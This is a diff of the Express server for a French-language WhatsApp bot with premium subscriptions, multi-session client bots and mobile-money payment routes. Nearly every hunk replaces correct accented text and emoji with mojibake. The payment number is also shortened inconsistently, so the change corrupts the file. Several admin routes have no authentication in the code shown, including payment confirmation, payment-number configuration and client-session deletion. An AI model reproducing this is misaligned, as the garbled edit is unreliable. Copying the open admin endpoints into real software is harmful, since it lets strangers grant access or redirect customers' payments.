+          qrContainer.innerHTML = '<div class="loader"></div><p style="color:#333;margin-top:15px;">VÃ©rification...</p>';
           refreshBtn.disabled = true;
           
         } else {
           // EN ATTENTE
-          statusBadge.textContent = '⏳ En attente du QR...';
+          statusBadge.textContent = 'â³ En attente du QR...';
           statusBadge.className = 'status waiting';
-          qrContainer.innerHTML = '<div class="loader"></div><p style="color:#333;margin-top:15px;">Génération du QR code...</p>';
+          qrContainer.innerHTML = '<div class="loader"></div><p style="color:#333;margin-top:15px;">GÃ©nÃ©ration du QR code...</p>';
           refreshBtn.disabled = false;
         }
         
@@ -10739,7 +10739,7 @@ app.get("/qr", (req, res) => {
       }
     }
     
-    // Première mise à jour immédiate
+    // PremiÃ¨re mise Ã  jour immÃ©diate
     updateQR();
     
     // Actualisation toutes les 2 secondes
@@ -10750,11 +10750,11 @@ app.get("/qr", (req, res) => {
   `);
 });
 
-// Page d'accueil mise à jour
+// Page d'accueil mise Ã  jour
 app.get("/", (req, res) => {
   const uptime = formatUptime(Date.now() - db.data.stats.startTime);
   const statusColor = qrState.isConnected ? "#4CAF50" : "#ff9800";
-  const statusText = qrState.isConnected ? "✅ Connecté" : "⏳ En attente de connexion";
+  const statusText = qrState.isConnected ? "âœ… ConnectÃ©" : "â³ En attente de connexion";
   
   res.send(`
 <!DOCTYPE html>
@@ -10827,36 +10827,36 @@ app.get("/", (req, res) => {
 </head>
 <body>
   <div class="container">
-    <h1>🌟 HANI-MD</h1>
+    <h1>ðŸŒŸ HANI-MD</h1>
     <p style="color:#aaa;">Bot WhatsApp Intelligent par H2025</p>
     
     <div class="status">${statusText}</div>
     
     <div class="stats">
       <div class="stat-item">
-        <span>⏱️ Uptime</span>
+        <span>â±ï¸ Uptime</span>
         <span class="stat-value">${uptime}</span>
       </div>
       <div class="stat-item">
-        <span>📨 Commandes</span>
+        <span>ðŸ“¨ Commandes</span>
         <span class="stat-value">${db.data.stats.commands}</span>
       </div>
       <div class="stat-item">
-        <span>👥 Utilisateurs</span>
+        <span>ðŸ‘¥ Utilisateurs</span>
         <span class="stat-value">${Object.keys(db.data.users).length}</span>
       </div>
       <div class="stat-item">
-        <span>🏘️ Groupes</span>
+        <span>ðŸ˜ï¸ Groupes</span>
         <span class="stat-value">${Object.keys(db.data.groups).length}</span>
       </div>
       <div class="stat-item">
-        <span>🌐 Mode</span>
+        <span>ðŸŒ Mode</span>
         <span class="stat-value">${config.MODE}</span>
       </div>
     </div>
     
-    <a href="/qr" class="btn">📱 Scanner QR Code</a>
-    <a href="/health" class="btn secondary">🔍 Health Check</a>
+    <a href="/qr" class="btn">ðŸ“± Scanner QR Code</a>
+    <a href="/health" class="btn secondary">ðŸ” Health Check</a>
     
     <div class="footer">
       <p>Version 1.0 | <a href="https://github.com/itestmypartner/HANI" style="color:#9c27b0;">GitHub</a></p>
@@ -10867,9 +10867,9 @@ app.get("/", (req, res) => {
   `);
 });
 
-// ═══════════════════════════════════════════════════════════
-// 💎 ROUTES PREMIUM WEB
-// ═══════════════════════════════════════════════════════════
+// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
+// ðŸ’Ž ROUTES PREMIUM WEB
+// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
 
 const crypto = require("crypto");
 const premiumAdminSessions = new Map();
@@ -10885,12 +10885,12 @@ if (fs.existsSync(premiumPublicPath)) {
 function requirePremiumAdmin(req, res, next) {
   const token = req.headers.authorization?.replace("Bearer ", "") || req.query.token;
   if (!token || !premiumAdminSessions.has(token)) {
-    return res.status(401).json({ error: "Non autorisé" });
+    return res.status(401).json({ error: "Non autorisÃ©" });
   }
   const session = premiumAdminSessions.get(token);
   if (Date.now() > session.expires) {
     premiumAdminSessions.delete(token);
-    return res.status(401).json({ error: "Session expirée" });
+    return res.status(401).json({ error: "Session expirÃ©e" });
   }
   next();
 }
@@ -10901,7 +10901,7 @@ app.post("/api/admin/login", (req, res) => {
   if (password === PREMIUM_ADMIN_PASSWORD) {
     const token = crypto.randomBytes(32).toString("hex");
     premiumAdminSessions.set(token, { expires: Date.now() + 24 * 60 * 60 * 1000 });
-    console.log(`[PREMIUM-WEB] 🔓 Connexion admin premium`);
+    console.log(`[PREMIUM-WEB] ðŸ”“ Connexion admin premium`);
     res.json({ success: true, token });
   } else {
     res.status(401).json({ error: "Mot de passe incorrect" });
@@ -10933,7 +10933,7 @@ app.get("/api/admin/users", requirePremiumAdmin, (req, res) => {
 app.post("/api/admin/users", requirePremiumAdmin, (req, res) => {
   try {
     const { phone, plan, days } = req.body;
-    if (!phone || !plan) return res.status(400).json({ error: "Numéro et plan requis" });
+    if (!phone || !plan) return res.status(400).json({ error: "NumÃ©ro et plan requis" });
     const jid = phone.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
     res.json(premiumDB.addPremium(jid, plan.toUpperCase(), days || 30));
   } catch (e) { res.status(500).json({ error: e.message }); }
@@ -11006,7 +11006,7 @@ app.get("/api/plans", (req, res) => {
   } catch (e) { res.status(500).json({ error: e.message }); }
 });
 
-// Endpoint des fonctionnalités par catégorie
+// Endpoint des fonctionnalitÃ©s par catÃ©gorie
 app.get("/api/features", (req, res) => {
   try {
     const config = fs.existsSync(premiumConfigPath) 
@@ -11048,7 +11048,7 @@ app.get("/api/status/:phone", (req, res) => {
 app.post("/api/activate", (req, res) => {
   try {
     const { code, phone } = req.body;
-    if (!code || !phone) return res.status(400).json({ error: "Code et numéro requis" });
+    if (!code || !phone) return res.status(400).json({ error: "Code et numÃ©ro requis" });
     const jid = phone.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
     res.json(premiumDB.redeemCode(code.toUpperCase(), jid));
   } catch (e) { res.status(500).json({ error: e.message }); }
@@ -11057,7 +11057,7 @@ app.post("/api/activate", (req, res) => {
 app.post("/api/subscribe", (req, res) => {
   try {
     const { phone, plan, paymentMethod } = req.body;
-    if (!phone || !plan) return res.status(400).json({ error: "Numéro et plan requis" });
+    if (!phone || !plan) return res.status(400).json({ error: "NumÃ©ro et plan requis" });
     
     const requestsFile = path.join(__dirname, "DataBase", "premium_requests.json");
     let requests = [];
@@ -11078,9 +11078,9 @@ app.post("/api/subscribe", (req, res) => {
     
     res.json({
       success: true,
-      message: "Demande enregistrée!",
+      message: "Demande enregistrÃ©e!",
       requestId: request.id,
-      paymentInfo: { number: "+2250150252467", amount: { BRONZE: 500, ARGENT: 1000, OR: 2000, DIAMANT: 5000, LIFETIME: 15000 }[plan.toUpperCase()] }
+      paymentInfo: { number: "+22550252467", amount: { BRONZE: 500, ARGENT: 1000, OR: 2000, DIAMANT: 5000, LIFETIME: 15000 }[plan.toUpperCase()] }
     });
   } catch (e) { res.status(500).json({ error: e.message }); }
 });
@@ -11105,10 +11105,10 @@ app.post("/api/admin/requests/:id/approve", requirePremiumAdmin, (req, res) => {
     }
     
     const request = requests.find(r => r.id === req.params.id);
-    if (!request) return res.status(404).json({ error: "Demande non trouvée" });
+    if (!request) return res.status(404).json({ error: "Demande non trouvÃ©e" });
     
     const codeResult = premiumDB.generateCode(request.plan);
-    if (!codeResult.success) return res.status(500).json({ error: "Erreur génération code" });
+    if (!codeResult.success) return res.status(500).json({ error: "Erreur gÃ©nÃ©ration code" });
     
     const jid = request.phone + "@s.whatsapp.net";
     premiumDB.redeemCode(codeResult.code, jid);
@@ -11118,20 +11118,20 @@ app.post("/api/admin/requests/:id/approve", requirePremiumAdmin, (req, res) => {
     request.code = codeResult.code;
     fs.writeFileSync(requestsFile, JSON.stringify(requests, null, 2));
     
-    res.json({ success: true, message: "Demande approuvée", code: codeResult.code, phone: request.phone });
+    res.json({ success: true, message: "Demande approuvÃ©e", code: codeResult.code, phone: request.phone });
   } catch (e) { res.status(500).json({ error: e.message }); }
 });
 
-// ═══════════════════════════════════════════════════════════
-// 🔗 ROUTES MULTI-SESSION (Bots clients)
-// ═══════════════════════════════════════════════════════════
+// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
+// ðŸ”— ROUTES MULTI-SESSION (Bots clients)
+// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
 
 let multiSession;
 try {
   multiSession = require('./lib/MultiSession');
-  console.log("[MULTI-SESSION] 📱 Module chargé");
+  console.log("[MULTI-SESSION] ðŸ“± Module chargÃ©");
 } catch (e) {
-  console.log("[MULTI-SESSION] ⚠️ Module non disponible:", e.message);
+  console.log("[MULTI-SESSION] âš ï¸ Module non disponible:", e.message);
 }
 
 // Route pour la page de connexion client
@@ -11148,7 +11148,7 @@ app.get('/api/premium/status/:clientId', (req, res) => {
     
     const clientInfo = multiSession.getClientInfo(req.params.clientId);
     if (!clientInfo) {
-      return res.status(404).json({ error: "Client non trouvé" });
+      return res.status(404).json({ error: "Client non trouvÃ©" });
     }
     
     res.json({
@@ -11164,7 +11164,7 @@ app.get('/api/premium/status/:clientId', (req, res) => {
   }
 });
 
-// API: Démarrer la connexion pour un client
+// API: DÃ©marrer la connexion pour un client
 app.post('/api/premium/start/:clientId', async (req, res) => {
   try {
     if (!multiSession) {
@@ -11173,25 +11173,25 @@ app.post('/api/premium/start/:clientId', async (req, res) => {
     
     const clientInfo = multiSession.getClientInfo(req.params.clientId);
     if (!clientInfo) {
-      return res.status(404).json({ error: "Client non trouvé" });
+      return res.status(404).json({ error: "Client non trouvÃ©" });
     }
     
-    // Vérifier expiration
+    // VÃ©rifier expiration
     if (clientInfo.expiresAt && new Date(clientInfo.expiresAt) < new Date()) {
-      return res.status(403).json({ error: "Abonnement expiré" });
+      return res.status(403).json({ error: "Abonnement expirÃ©" });
     }
     
-    // Si déjà connecté, retourner le statut
+    // Si dÃ©jÃ  connectÃ©, retourner le statut
     if (clientInfo.status === 'connected' && multiSession.activeSessions.has(req.params.clientId)) {
       return res.json({ status: 'connected', phoneNumber: clientInfo.phoneNumber });
     }
     
-    // Démarrer la connexion
+    // DÃ©marrer la connexion
     multiSession.startClientConnection(
       req.params.clientId,
-      (qr, id) => console.log(`[MULTI-SESSION] QR prêt pour ${id}`),
-      (sock, id, phone) => console.log(`[MULTI-SESSION] Client ${id} connecté: ${phone}`),
-      (id, shouldReconnect) => console.log(`[MULTI-SESSION] Client ${id} déconnecté`)
+      (qr, id) => console.log(`[MULTI-SESSION] QR prÃªt pour ${id}`),
+      (sock, id, phone) => console.log(`[MULTI-SESSION] Client ${id} connectÃ©: ${phone}`),
+      (id, shouldReconnect) => console.log(`[MULTI-SESSION] Client ${id} dÃ©connectÃ©`)
     ).catch(e => console.error(`[MULTI-SESSION] Erreur:`, e.message));
     
     res.json({ status: 'starting', message: 'Connexion en cours...' });
@@ -11209,21 +11209,21 @@ app.get('/api/premium/qr/:clientId', (req, res) => {
     
     const clientInfo = multiSession.getClientInfo(req.params.clientId);
     if (!clientInfo) {
-      return res.status(404).json({ error: "Client non trouvé" });
+      return res.status(404).json({ error: "Client non trouvÃ©" });
     }
     
-    // Si connecté
+    // Si connectÃ©
     if (clientInfo.status === 'connected') {
       return res.json({ status: 'connected', phoneNumber: clientInfo.phoneNumber, plan: clientInfo.plan });
     }
     
-    // Récupérer le QR
+    // RÃ©cupÃ©rer le QR
     const qr = multiSession.getPendingQR(req.params.clientId);
     if (qr) {
       return res.json({ qr, status: 'pending' });
     }
     
-    res.json({ status: 'waiting', message: 'QR en préparation...' });
+    res.json({ status: 'waiting', message: 'QR en prÃ©paration...' });
   } catch (e) {
     res.status(500).json({ error: e.message });
   }
@@ -11256,7 +11256,7 @@ app.get('/api/premium/clients', (req, res) => {
   }
 });
 
-// API: Arrêter une session client (admin)
+// API: ArrÃªter une session client (admin)
 app.post('/api/premium/stop/:clientId', async (req, res) => {
   try {
     if (!multiSession) {
@@ -11264,7 +11264,7 @@ app.post('/api/premium/stop/:clientId', async (req, res) => {
     }
     
     await multiSession.stopClientSession(req.params.clientId);
-    res.json({ success: true, message: "Session arrêtée" });
+    res.json({ success: true, message: "Session arrÃªtÃ©e" });
   } catch (e) {
     res.status(500).json({ error: e.message });
   }
@@ -11278,23 +11278,23 @@ app.delete('/api/premium/client/:clientId', async (req, res) => {
     }
     
     await multiSession.deleteClientSession(req.params.clientId);
-    res.json({ success: true, message: "Client supprimé" });
+    res.json({ success: true, message: "Client supprimÃ©" });
   } catch (e) {
     res.status(500).json({ error: e.message });
   }
 });
 
-// ═══════════════════════════════════════════════════════════
-// 🆕 NOUVELLES ROUTES - INSCRIPTION CLIENTS COMPLÈTE
-// ═══════════════════════════════════════════════════════════
+// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
+// ðŸ†• NOUVELLES ROUTES - INSCRIPTION CLIENTS COMPLÃˆTE
+// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
 
-// API: Inscription d'un nouveau client (après paiement)
+// API: Inscription d'un nouveau client (aprÃ¨s paiement)
 app.post('/api/clients/register', async (req, res) => {
   try {
     const { phone, plan, email, name, transactionId } = req.body;
     
     if (!phone || !plan) {
-      return res.status(400).json({ error: "Numéro de téléphone et plan requis" });
+      return res.status(400).json({ error: "NumÃ©ro de tÃ©lÃ©phone et plan requis" });
     }
     
     // Valider le plan
@@ -11303,22 +11303,22 @@ app.post('/api/clients/register', async (req, res) => {
       return res.status(400).json({ error: "Plan invalide" });
     }
     
-    // Vérifier si MultiSession est disponible
+    // VÃ©rifier si MultiSession est disponible
     if (!multiSession) {
-      return res.status(500).json({ error: "Système multi-session non disponible" });
+      return res.status(500).json({ error: "SystÃ¨me multi-session non disponible" });
     }
     
-    // Durées selon le plan
+    // DurÃ©es selon le plan
     const planDurations = { bronze: 30, argent: 30, or: 30, diamant: 30, lifetime: -1 };
     const days = planDurations[plan.toLowerCase()];
     
-    // Créer le client via MultiSession
+    // CrÃ©er le client via MultiSession
     const result = multiSession.createClientSession 
       ? await multiSession.createClientSession(transactionId || 'DIRECT', plan.toUpperCase(), 
           days === -1 ? null : new Date(Date.now() + days * 24 * 60 * 60 * 1000).toISOString())
       : { clientId: 'CLI_' + Date.now().toString(36).toUpperCase(), status: 'pending' };
     
-    // Enregistrer dans le système de demandes
+    // Enregistrer dans le systÃ¨me de demandes
     const requestsFile = path.join(__dirname, "DataBase", "client_registrations.json");
     let registrations = [];
     if (fs.existsSync(requestsFile)) {
@@ -11340,22 +11340,22 @@ app.post('/api/clients/register', async (req, res) => {
     registrations.push(registration);
     fs.writeFileSync(requestsFile, JSON.stringify(registrations, null, 2));
     
-    console.log(`[CLIENT] 📝 Nouveau client inscrit: ${result.clientId} (${plan})`);
+    console.log(`[CLIENT] ðŸ“ Nouveau client inscrit: ${result.clientId} (${plan})`);
     
     res.json({
       success: true,
       clientId: result.clientId,
       plan: plan.toUpperCase(),
       connectUrl: `/connect.html?id=${result.clientId}`,
-      message: "Inscription réussie! Scannez le QR code pour connecter votre WhatsApp."
+      message: "Inscription rÃ©ussie! Scannez le QR code pour connecter votre WhatsApp."
     });
   } catch (e) {
-    console.error('[CLIENT] ❌ Erreur inscription:', e.message);
+    console.error('[CLIENT] âŒ Erreur inscription:', e.message);
     res.status(500).json({ error: e.message });
   }
 });
 
-// API: Vérifier un ID client
+// API: VÃ©rifier un ID client
 app.get('/api/clients/verify/:clientId', (req, res) => {
   try {
     const clientId = req.params.clientId;
@@ -11389,7 +11389,7 @@ app.get('/api/clients/verify/:clientId', (req, res) => {
       }
     }
     
-    res.json({ valid: false, error: "Client non trouvé" });
+    res.json({ valid: false, error: "Client non trouvÃ©" });
   } catch (e) {
     res.status(500).json({ error: e.message });
   }
@@ -11404,18 +11404,18 @@ app.post('/api/clients/connect/:clientId', async (req, res) => {
       return res.status(500).json({ error: "Multi-session non disponible" });
     }
     
-    // Vérifier le client
+    // VÃ©rifier le client
     const client = multiSession.getClientInfo(clientId);
     if (!client) {
-      return res.status(404).json({ error: "Client non trouvé. Veuillez d'abord vous inscrire." });
+      return res.status(404).json({ error: "Client non trouvÃ©. Veuillez d'abord vous inscrire." });
     }
     
-    // Vérifier expiration
+    // VÃ©rifier expiration
     if (client.expiresAt && new Date(client.expiresAt) < new Date()) {
-      return res.status(403).json({ error: "Votre abonnement a expiré. Veuillez renouveler." });
+      return res.status(403).json({ error: "Votre abonnement a expirÃ©. Veuillez renouveler." });
     }
     
-    // Si déjà connecté
+    // Si dÃ©jÃ  connectÃ©
     if (client.status === 'connected' && multiSession.activeSessions?.has(clientId)) {
       return res.json({ 
         status: 'connected', 
@@ -11424,15 +11424,15 @@ app.post('/api/clients/connect/:clientId', async (req, res) => {
       });
     }
     
-    // Démarrer la connexion
+    // DÃ©marrer la connexion
     await multiSession.startClientConnection(
       clientId,
-      (qr, id) => console.log(`[CLIENT] 📱 QR prêt pour ${id}`),
-      (sock, id, phone) => console.log(`[CLIENT] ✅ ${id} connecté: ${phone}`),
-      (id, shouldReconnect) => console.log(`[CLIENT] 🔴 ${id} déconnecté`)
+      (qr, id) => console.log(`[CLIENT] ðŸ“± QR prÃªt pour ${id}`),
+      (sock, id, phone) => console.log(`[CLIENT] âœ… ${id} connectÃ©: ${phone}`),
+      (id, shouldReconnect) => console.log(`[CLIENT] ðŸ”´ ${id} dÃ©connectÃ©`)
     );
     
-    res.json({ status: 'connecting', message: 'Connexion en cours... Le QR code sera bientôt disponible.' });
+    res.json({ status: 'connecting', message: 'Connexion en cours... Le QR code sera bientÃ´t disponible.' });
   } catch (e) {
     res.status(500).json({ error: e.message });
   }
@@ -11449,26 +11449,26 @@ app.get('/api/clients/qr/:clientId', async (req, res) => {
     
     const client = multiSession.getClientInfo(clientId);
     if (!client) {
-      return res.status(404).json({ error: "Client non trouvé" });
+      return res.status(404).json({ error: "Client non trouvÃ©" });
     }
     
-    // Si connecté
+    // Si connectÃ©
     if (client.status === 'connected') {
       return res.json({ 
         status: 'connected', 
         phoneNumber: client.phoneNumber,
         plan: client.plan,
-        message: "Votre bot est déjà connecté!"
+        message: "Votre bot est dÃ©jÃ  connectÃ©!"
       });
     }
     
-    // Récupérer le QR
+    // RÃ©cupÃ©rer le QR
     const qr = multiSession.getPendingQR(clientId);
     if (qr) {
       return res.json({ status: 'pending', qr });
     }
     
-    res.json({ status: 'waiting', message: 'QR code en préparation...' });
+    res.json({ status: 'waiting', message: 'QR code en prÃ©paration...' });
   } catch (e) {
     res.status(500).json({ error: e.message });
   }
@@ -11486,13 +11486,13 @@ app.get('/api/plans', (req, res) => {
   res.json({ success: true, plans });
 });
 
-// API: Obtenir les méthodes de paiement
+// API: Obtenir les mÃ©thodes de paiement
 app.get('/api/payment-methods', (req, res) => {
   const methods = [
-    { id: "orange", name: "Orange Money", number: "+2250150252467", logo: "🟠" },
-    { id: "mtn", name: "MTN Money", number: "+2250150252467", logo: "🟡" },
-    { id: "wave", name: "Wave", number: "+2250150252467", logo: "🔵" },
-    { id: "moov", name: "Moov Money", number: "+2250150252467", logo: "🔷" }
+    { id: "orange", name: "Orange Money", number: "+22550252467", logo: "ðŸŸ " },
+    { id: "mtn", name: "MTN Money", number: "+22550252467", logo: "ðŸŸ¡" },
+    { id: "wave", name: "Wave", number: "+22550252467", logo: "ðŸ”µ" },
+    { id: "moov", name: "Moov Money", number: "+22550252467", logo: "ðŸ”·" }
   ];
   res.json({ success: true, methods });
 });
@@ -11523,29 +11523,29 @@ app.get('/api/stats', (req, res) => {
   }
 });
 
-// ═══════════════════════════════════════════════════════════
-// 💰 ROUTES API PAIEMENT MOBILE MONEY
-// ═══════════════════════════════════════════════════════════
+// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
+// ðŸ’° ROUTES API PAIEMENT MOBILE MONEY
+// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
 
 let paymentSystem;
 try {
   paymentSystem = require('./lib/PaymentSystem');
-  console.log("[PAYMENT] 💰 Module de paiement chargé");
+  console.log("[PAYMENT] ðŸ’° Module de paiement chargÃ©");
 } catch (e) {
-  console.log("[PAYMENT] ⚠️ Module de paiement non disponible:", e.message);
+  console.log("[PAYMENT] âš ï¸ Module de paiement non disponible:", e.message);
 }
 
-// API: Créer une demande de paiement
+// API: CrÃ©er une demande de paiement
 app.post('/api/payment/create', async (req, res) => {
   try {
     if (!paymentSystem) {
-      return res.status(500).json({ error: "Système de paiement non disponible" });
+      return res.status(500).json({ error: "SystÃ¨me de paiement non disponible" });
     }
     
     const { phone, plan, paymentMethod, name, email } = req.body;
     
     if (!phone || !plan || !paymentMethod) {
-      return res.status(400).json({ error: "Téléphone, plan et méthode de paiement requis" });
+      return res.status(400).json({ error: "TÃ©lÃ©phone, plan et mÃ©thode de paiement requis" });
     }
     
     const result = paymentSystem.createPaymentRequest(phone, plan, paymentMethod, name, email);
@@ -11563,28 +11563,28 @@ app.post('/api/payment/create', async (req, res) => {
       
       if (hani && result.instructions) {
         await hani.sendMessage(clientJid, { text: result.instructions });
-        console.log(`[PAYMENT] 📱 Instructions envoyées au client: +${phone}`);
+        console.log(`[PAYMENT] ðŸ“± Instructions envoyÃ©es au client: +${phone}`);
       }
     } catch (e) {
-      console.log("[PAYMENT] ⚠️ Erreur envoi client:", e.message);
+      console.log("[PAYMENT] âš ï¸ Erreur envoi client:", e.message);
     }
     
-    // Envoyer notification à l'admin via WhatsApp si le bot est connecté
+    // Envoyer notification Ã  l'admin via WhatsApp si le bot est connectÃ©
     try {
       const adminJid = config.adminWhatsApp + "@s.whatsapp.net";
       
       if (hani && payment) {
         const notifMessage = paymentSystem.generateAdminNotification(payment);
         await hani.sendMessage(adminJid, { text: notifMessage });
-        console.log(`[PAYMENT] 📱 Notification envoyée à l'admin`);
+        console.log(`[PAYMENT] ðŸ“± Notification envoyÃ©e Ã  l'admin`);
       }
     } catch (e) {
-      console.log("[PAYMENT] ⚠️ Erreur notification admin:", e.message);
+      console.log("[PAYMENT] âš ï¸ Erreur notification admin:", e.message);
     }
     
     res.json(result);
   } catch (e) {
-    console.error('[PAYMENT] ❌ Erreur:', e.message);
+    console.error('[PAYMENT] âŒ Erreur:', e.message);
     res.status(500).json({ error: e.message });
   }
 });
@@ -11593,7 +11593,7 @@ app.post('/api/payment/create', async (req, res) => {
 app.get('/api/payment/pending', (req, res) => {
   try {
     if (!paymentSystem) {
-      return res.status(500).json({ error: "Système de paiement non disponible" });
+      return res.status(500).json({ error: "SystÃ¨me de paiement non disponible" });
     }
     
     const pending = paymentSystem.getPendingPayments();
@@ -11603,11 +11603,11 @@ app.get('/api/payment/pending', (req, res) => {
   }
 });
 
-// API: Obtenir les paiements complétés (admin)
+// API: Obtenir les paiements complÃ©tÃ©s (admin)
 app.get('/api/payment/completed', (req, res) => {
   try {
     if (!paymentSystem) {
-      return res.status(500).json({ error: "Système de paiement non disponible" });
+      return res.status(500).json({ error: "SystÃ¨me de paiement non disponible" });
     }
     
     const limit = parseInt(req.query.limit) || 50;
@@ -11622,7 +11622,7 @@ app.get('/api/payment/completed', (req, res) => {
 app.post('/api/payment/confirm/:paymentId', async (req, res) => {
   try {
     if (!paymentSystem) {
-      return res.status(500).json({ error: "Système de paiement non disponible" });
+      return res.status(500).json({ error: "SystÃ¨me de paiement non disponible" });
     }
     
     const { transactionId, notes } = req.body;
@@ -11639,7 +11639,7 @@ app.post('/api/payment/confirm/:paymentId', async (req, res) => {
       const planDurations = { BRONZE: 30, ARGENT: 30, OR: 30, DIAMANT: 30, LIFETIME: -1 };
       const days = planDurations[payment.plan] || 30;
       
-      // Créer la session client
+      // CrÃ©er la session client
       if (multiSession) {
         const clientResult = await multiSession.createClientSession(
           payment.orderId, 
@@ -11657,17 +11657,17 @@ app.post('/api/payment/confirm/:paymentId', async (req, res) => {
         const confirmMessage = paymentSystem.generateClientConfirmation(payment);
         await hani.sendMessage(clientJid, { text: confirmMessage });
         
-        // Si on a créé un clientId, envoyer le lien
+        // Si on a crÃ©Ã© un clientId, envoyer le lien
         if (result.clientId) {
           await hani.sendMessage(clientJid, { 
-            text: `🔗 *Votre lien de connexion:*\n${process.env.BASE_URL || 'http://localhost:3000'}/connect.html?id=${result.clientId}\n\nOu utilisez cet ID: *${result.clientId}*` 
+            text: `ðŸ”— *Votre lien de connexion:*\n${process.env.BASE_URL || 'http://localhost:3000'}/connect.html?id=${result.clientId}\n\nOu utilisez cet ID: *${result.clientId}*` 
           });
         }
         
-        console.log(`[PAYMENT] 📱 Confirmation envoyée au client: ${payment.clientPhone}`);
+        console.log(`[PAYMENT] ðŸ“± Confirmation envoyÃ©e au client: ${payment.clientPhone}`);
       }
     } catch (e) {
-      console.log("[PAYMENT] ⚠️ Erreur activation/notification:", e.message);
+      console.log("[PAYMENT] âš ï¸ Erreur activation/notification:", e.message);
     }
     
     res.json(result);
@@ -11680,7 +11680,7 @@ app.post('/api/payment/confirm/:paymentId', async (req, res) => {
 app.post('/api/payment/reject/:paymentId', async (req, res) => {
   try {
     if (!paymentSystem) {
-      return res.status(500).json({ error: "Système de paiement non disponible" });
+      return res.status(500).json({ error: "SystÃ¨me de paiement non disponible" });
     }
     
     const { reason } = req.body;
@@ -11695,11 +11695,11 @@ app.post('/api/payment/reject/:paymentId', async (req, res) => {
       if (hani && result.payment) {
         const clientJid = result.payment.clientPhone + "@s.whatsapp.net";
         await hani.sendMessage(clientJid, { 
-          text: `❌ *Paiement non validé*\n\nVotre demande de paiement (${result.payment.orderId}) n'a pas été validée.\n\n${reason ? `Raison: ${reason}\n\n` : ''}Veuillez réessayer ou contactez le support.` 
+          text: `âŒ *Paiement non validÃ©*\n\nVotre demande de paiement (${result.payment.orderId}) n'a pas Ã©tÃ© validÃ©e.\n\n${reason ? `Raison: ${reason}\n\n` : ''}Veuillez rÃ©essayer ou contactez le support.` 
         });
       }
     } catch (e) {
-      console.log("[PAYMENT] ⚠️ Erreur notification rejet:", e.message);
+      console.log("[PAYMENT] âš ï¸ Erreur notification rejet:", e.message);
     }
     
     res.json(result);
@@ -11712,7 +11712,7 @@ app.post('/api/payment/reject/:paymentId', async (req, res) => {
 app.get('/api/payment/stats', (req, res) => {
   try {
     if (!paymentSystem) {
-      return res.status(500).json({ error: "Système de paiement non disponible" });
+      return res.status(500).json({ error: "SystÃ¨me de paiement non disponible" });
     }
     
     const stats = paymentSystem.getPaymentStats();
@@ -11722,16 +11722,16 @@ app.get('/api/payment/stats', (req, res) => {
   }
 });
 
-// API: Vérifier un paiement par ID
+// API: VÃ©rifier un paiement par ID
 app.get('/api/payment/check/:paymentId', (req, res) => {
   try {
     if (!paymentSystem) {
-      return res.status(500).json({ error: "Système de paiement non disponible" });
+      return res.status(500).json({ error: "SystÃ¨me de paiement non disponible" });
     }
     
     const payment = paymentSystem.getPayment(req.params.paymentId);
     if (!payment) {
-      return res.status(404).json({ error: "Paiement non trouvé" });
+      return res.status(404).json({ error: "Paiement non trouvÃ©" });
     }
     
     res.json({ success: true, payment });
@@ -11740,11 +11740,11 @@ app.get('/api/payment/check/:paymentId', (req, res) => {
   }
 });
 
-// API: Configuration du système de paiement (admin)
+// API: Configuration du systÃ¨me de paiement (admin)
 app.get('/api/payment/config', (req, res) => {
   try {
     if (!paymentSystem) {
-      return res.status(500).json({ error: "Système de paiement non disponible" });
+      return res.status(500).json({ error: "SystÃ¨me de paiement non disponible" });
     }
     
     const config = paymentSystem.getConfig();
@@ -11754,11 +11754,11 @@ app.get('/api/payment/config', (req, res) => {
   }
 });
 
-// API: Mettre à jour la configuration (admin)
+// API: Mettre Ã  jour la configuration (admin)
 app.post('/api/payment/config', (req, res) => {
   try {
     if (!paymentSystem) {
-      return res.status(500).json({ error: "Système de paiement non disponible" });
+      return res.status(500).json({ error: "SystÃ¨me de paiement non disponible" });
     }
     
     const { adminWhatsApp, paymentNumbers } = req.body;
@@ -11781,30 +11781,30 @@ app.post('/api/payment/config', (req, res) => {
   }
 });
 
-console.log("[PREMIUM-WEB] 💎 Routes premium chargées");
-console.log("[CLIENT-API] 📱 Routes inscription clients chargées");
-console.log("[PAYMENT-API] 💰 Routes paiement chargées");
-console.log("[MULTI-SESSION] 🔗 Routes multi-session chargées");
+console.log("[PREMIUM-WEB] ðŸ’Ž Routes premium chargÃ©es");
+console.log("[CLIENT-API] ðŸ“± Routes inscription clients chargÃ©es");
+console.log("[PAYMENT-API] ðŸ’° Routes paiement chargÃ©es");
+console.log("[MULTI-SESSION] ðŸ”— Routes multi-session chargÃ©es");
 
 app.listen(port, () => {
   console.log(`[WEB] Serveur web sur le port ${port}`);
